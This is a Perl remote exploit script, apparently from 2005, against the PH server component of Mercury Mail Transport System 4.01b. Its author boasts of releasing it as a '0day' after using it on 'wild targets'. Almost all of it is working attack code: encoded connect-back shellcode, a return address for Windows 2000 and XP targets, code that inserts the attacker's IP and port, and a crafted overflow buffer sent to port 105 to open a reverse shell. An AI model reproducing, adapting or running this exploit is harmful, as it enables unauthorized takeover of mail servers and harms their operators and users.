### mercurysexywarez
### Okayokay THiS iS 0DAY!!!
### Mercury Mail Transport System 4.01b REMOTE ROOT EXPLOIT
### (PH SERVER)
### since me and my folks didn't find enough wild targets,
### i release this pretty warez to the public :PP
### kcope [kingcope(at)gmx.net] in 2005! JUUAREZ!
### Big thanx to blackzero,revoguard,qobaiashi,unf,secrew!
###################################################################
use IO::Socket;
# 316 bytes
$cbsc =
&quot;\xEB\x10\x5B\x4B\x33\xC9\x66\xB9\x25\x01\x80\x34\x0B\xC2\xE2\xFA&quot;
.&quot;\xEB\x05\xE8\xEB\xFF\xFF\xFF&quot;
.&quot;\x2B\x39\xC2\xC2\xC2\x9D\xA6\x63\xF2\xC2\xC2\xC2\x49\x82\xCE\x49&quot;
.&quot;\xB2\xDE\x6F\x49\xAA\xCA\x49\x35\xA8\xC6\x9B\x2A\x59\xC2\xC2\xC2&quot;
.&quot;\x20\x3B\xAA\xF1\xF0\xC2\xC2\xAA\xB5\xB1\xF0\x9D\x96\x3D\xD4\x49&quot;
.&quot;\x2A\xA8\xC6\x9B\x2A\x40\xC2\xC2\xC2\x20\x3B\x43\x2E\x52\xC3\xC2&quot;
.&quot;\xC2\x96\xAA\xC3\xC3\xC2\xC2\x3D\x94\xD2\x92\x92\x92\x92\x82\x92&quot;
.&quot;\x82\x92\x3D\x94\xD6\x49\x1A\xAA\xBD\xC2\xC2\xC3\xAA\xC0\xC2\xC2&quot;
.&quot;\xF7\x49\x0E\xA8\xD2\x93\x91\x3D\x94\xDA\x47\x02\xB7\x88\xAA\xA1&quot;
.&quot;\xAF\xA6\xC2\x4B\xA4\xF2\x41\x2E\x96\x4F\xFE\xE6\xA8\xD7\x9B\x69&quot;
.&quot;\x20\x3F\x04\x86\xE6\xD2\x86\x3C\x86\xE6\xFF\x4B\x9E\xE6\x8A\x4B&quot;
.&quot;\x9E\xE6\x8E\x4B\x9E\xE6\x92\x4F\x86\xE6\xD2\x96\x92\x93\x93\x93&quot;
.&quot;\xA8\xC3\x93\x93\x3D\xB4\xF2\x93\x3D\x94\xC6\x49\x0E\xA8\x3D\x3D&quot;
.&quot;\xF3\x3D\x94\xCA\x91\x3D\x94\xDE\x3D\x94\xCE\x93\x94\x49\x87\xFE&quot;
.&quot;\x49\x96\xEA\xBA\xC1\x17\x90\x49\xB0\xE2\xC1\x37\xF1\x0B\x8B\x83&quot;
.&quot;\x6F\xC1\x07\xF1\x19\xCD\x7C\xD2\xF8\x14\xB6\xCA\x03\x09\xCF\xC1&quot;
.&quot;\x18\x82\x29\x33\xF9\xDD\xB7\x25\x98\x49\x98\xE6\xC1\x1F\xA4\x49&quot;
.&quot;\xCE\x89\x49\x98\xDE\xC1\x1F\x49\xC6\x49\xC1\x07\x69\x9C\x9B\x01&quot;
.&quot;\x2A\xC2\x3D\x3D\x3D\x4C\x8C\xCC\x2E\xB0\x3C\x71\xD4\x6F\x1B\xC7&quot;
.&quot;\x0C\xBC\x1A\x20\xB1\x09\x2F\x3E\xF9\x1B\xCB\x37\x6F\x2E\x3B\x68&quot;
.&quot;\xA2\x25\xBB\x04\xBB&quot;;

$numtargets = 1;

@targets =
(
 [&quot;Mercury Mail Transport System 4.01b Win2k SP4/WinXP SP2&quot;, &quot;\x83\xf2\x41\x00&quot;]
);

print &quot;Okayokay THiS iS 0DAY!!!\n&quot;;
print &quot;Mercury Mail Transport System 4.01b REMOTE ROOT EXPLOIT\nkcope [kingcope(at)gmx.net] in 2005! JUUAREZ!\n&quot;;
print &quot;Big thanx to blackzero,revoguard,qobaiashi,unf,secrew!\n&quot;;
if ($#ARGV ne 3) {
       print &quot;usage: mecurysexywarez.pl target targettype yourip yourport\n\n&quot;;
   for ($i=0; $i&lt;$numtargets; $i++) {
        print &quot; [&quot;.$i.&quot;]...&quot;. $targets[$i][0]. &quot;\n&quot;;
   }
       exit(0);
}

$sock = IO::Socket::INET-&gt;new(PeerAddr =&gt; $ARGV[0],
                             PeerPort =&gt; '105',
                             Proto    =&gt; 'tcp') || die(&quot;Oh my godess! Port not open! Pleeze open and try again :PP&quot;);
$tt=$ARGV[1];
$cbip=$ARGV[2];
$cbport=$ARGV[3];

($a1, $a2, $a3, $a4) = split(//, gethostbyname(&quot;$cbip&quot;));
$a1 = chr(ord($a1) ^ 0xc2);
$a2 = chr(ord($a2) ^ 0xc2);
$a3 = chr(ord($a3) ^ 0xc2);
$a4 = chr(ord($a4) ^ 0xc2);
substr($cbsc, 111, 4, $a1 . $a2 . $a3 . $a4);

($p1, $p2) = split(//, reverse(pack(&quot;s&quot;, $cbport)));
$p1 = chr(ord($p1) ^ 0xc2);
$p2 = chr(ord($p2) ^ 0xc2);
substr($cbsc, 118, 2, $p1 . $p2);

$pad=&quot;A&quot; x 408 . $cbsc . &quot;\x90\x90\xeb\x04&quot;;
$pad2=&quot;A&quot; x 440;

$ret=$targets[$tt][1];
$x=$pad.$ret.&quot;JJJJKKKKLLLLMMMMNNNNOOOOPPPP\xe9\x87\xfe\xff\xff&quot;.$pad2;
print $sock &quot;$x\r\n&quot;;

while (&lt;$sock&gt;) {
       print;
}

